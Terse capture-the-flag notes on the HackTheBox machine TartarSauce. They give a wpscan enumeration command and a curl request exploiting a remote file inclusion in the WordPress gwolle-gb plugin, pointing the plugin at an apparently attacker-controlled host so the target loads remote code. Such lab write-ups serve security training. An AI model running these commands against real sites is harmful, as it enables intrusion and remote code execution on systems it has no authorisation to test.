Application get from machine TartarSauce in HTB.

Index:
- Wordpress
- RFI

First of all get where the wp applciation is running:
http://10.10.10.88/webservices/wp/

Second annalyze with wp-scan
`wpscan -u http://10.10.10.88/webservices/wp/ --enumerate p,t,u | tee wpscan.log`

Exploit the RFI from the gwolle-gb plugin.
`curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.15.99/`
